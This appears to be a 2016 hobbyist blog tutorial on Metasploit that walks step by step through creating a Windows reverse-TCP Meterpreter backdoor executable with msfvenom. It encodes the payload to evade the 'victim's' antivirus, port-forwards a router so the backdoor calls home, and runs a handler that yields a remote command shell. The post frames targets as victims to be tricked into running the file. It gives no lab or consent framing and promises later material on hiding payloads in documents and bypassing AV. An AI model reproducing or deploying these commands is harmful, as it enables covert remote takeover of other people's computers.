---
title: Beginner's Guide to Metasploit
date: 2016-03-27 12:00:00 Z
layout: post
comments: true
subtitle: Linux, not Windows
author: ex0dus
header-img: img/PostBG/post-bg-06.png
---

Due to popular request, I'm going to teach Metasploit.

**Metasploit** is a pen testing framework suite written in the Ruby programming language. People use Metasploit to commonly gain access to a computer, through exploits, which find flaws, whether in the system or software the victim has and allows you to gain access.

It is pretty complicated, so I will be covering some of the essentials in a simple tutorial. We will set up a basic so-called "virus". Technically it’s a payload that acts as a backdoor, so that once the user executes it, you get ahold of their computer.

This tutorial will mostly base around the premise that your target is outside your network, so there is going to be a little configuration.

## Installing

If you are on Kali Linux, which is recommended, metasploit is automatically installed, as I have said before. Simply type **"msfconsole"** to get started. I recommend using the Linux version. The Windows version is pretty limited and is kind of shit. If you are on Ubuntu like me, and want to install it, good luck. This was probably one of the hardest things I've ever done. You might as well use Kali on VM if you can't install it. But if you are hardcore, click [**Here**](http://www.darkoperator.com/installing-metasploit-in-ubunt/)

## Getting Started

1\. Type "ifconfig" in your terminal. Obtain your inet address, most likely in wlan0 or eth0 (it should be 192.168.x.x for most). This is your computers given address on your network. ![](http://i.imgur.com/Ef7BPHX.png)

2\. Open your router settings. This is achieved by typing 192.168.1.1 in your browser (search it up if it isn't it. Every router brand is different. I use a Verizon router). ![](http://i.imgur.com/3ol73Gt.png)
3\. Find out where port forwarding is. There may be a tab called “Firewall” you might have to click. Again, all router brands are different in terms of settings and configuration, so you might have to go on the Internet and search it up. For my Verizon router, there is a tab called “Firewall”. After clicking on it, I get routed to another page, where this a tab on the side called “Port Forwarding”. ![](http://i.imgur.com/KV6h0aT.png) 4\. Enter the IP address you had previously, the one for your computer. Port forward port “4444”. What will happen is, when you receive a request for a connection to your public IP address through port 4444, it will be rerouted to your local IP. It’s kind of like a map. Port forwarding is me building a shortcut. 5\. In your terminal, we will make our payload. Type:

    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00′ LHOST=[your PUBLIC IP] LPORT=4444 -f exe > payload.exe

Let’s break this down. **MSFvenom** is the payload creation script (it was originally msfpayload). **–P** is the parameter to pass that signifies what kind of payload we are creating. In this case, we are creating a **windows/meterpreter/reverse_tcp** one. This kind of payload will create a shell called Meterpreter, which is like the Command Line, but for hackers. I’ll get to it later. **–E x86/shikata_ga_nai** is the parameter for encoding the payload using shikata_ga_nai, where we mask it so that the victim’s anti-virus won’t detect the payload, since it is technically, a virus. Encoding a payload using MSFvenom isn’t really effective anymore, but it is for the sake of demonstration. Don’t worry, there are ways to mask payloads and bypass AV. I will talk about it later. **–I 5** means we encode it 5 times. **–B ‘x/00’** has something to do with shellcode, and we won’t really get into it. Now however the next part, LHOST and LPORT is important. You will enter your public IP address in LHOST. Public, not the 192.168.x.x one. Your LPORT will be 4444\. This means that once the victim opens the payload, a connection will be sent to your public IP, and it will forwarded to your local IP (the 192.168.x.x one), where a listener will be set up (we will do this in the next 2 steps). 6\. After you press enter, the payload will generate. Open another terminal and type “msfconsole”. You will see an interpreter-style-thingy like this: ![](http://i.imgur.com/uOFGncN.png) 7\. After your payload is generated, it should be in your /root/ directory. Leave it where it is for now. In your terminal with Metasploit open, type

    msf > use exploit/multi/handler

8\. This is the handler that will be set up to handle the incoming request from the victim's computer. Now type in:

    msf exploit(handler) > set LHOST=[your LOCAL IP here]

9\. We will establish a listener that will listen for the request. It will be hosted on your computer, hence the LOCAL IP.

<pre>**msf exploit(handler) >**set LPORT=4444</pre>

10\. This establishes the port. Now type:

<pre>**msf exploit(handler) >**show options</pre>

11\. Everything should be set and in place. Now type run:

    msf exploit(handler) >run
    12\. You will see something like:
    [*]Started reverse handler on 192.168.x.x:4444
    [*]Starting the payload handler…

13\. You have set up your handler and listener! Now in order to get a Meterpreter shell, a victim needs to open your payload. Doing so, a connection will be sent back, and your listener will intercept the connection and the handler will start a meterpreter session, which looks like:

<pre>**meterpreter>**</pre>

14\. Congrats! You learnt the basics of Metasploit. Now you may ask, what to do with meterpreter? Well, here’s an example:

    meterpreter> shell
    Process 2314 created
    Channel 1 created
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation. All rights reserved.
    C:\Windows\System32>

This establishes a Windows Command Prompt shell and now you have access over the victim's computer! You can do much more with Meterpreter. You can take a screeshot of the victim's computer, see system processes, steal hash, etc. Here’s a list: [**Null Byte**](http://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/)

Well that is all. This article was probably a little dull, but I will soon elaborate on this tutorial. I will talk about exploitation through obfuscating payloads in PDF files, text documents, videos, etc. I will also talk about bypassing AV (anti-virus), since many modern day AVs detect these Metasploit payloads as viruses and backdoors.

## I have set up a Contact Form in the **Contact** section of this site! Please do not hesistate to use it if you have any inquiries
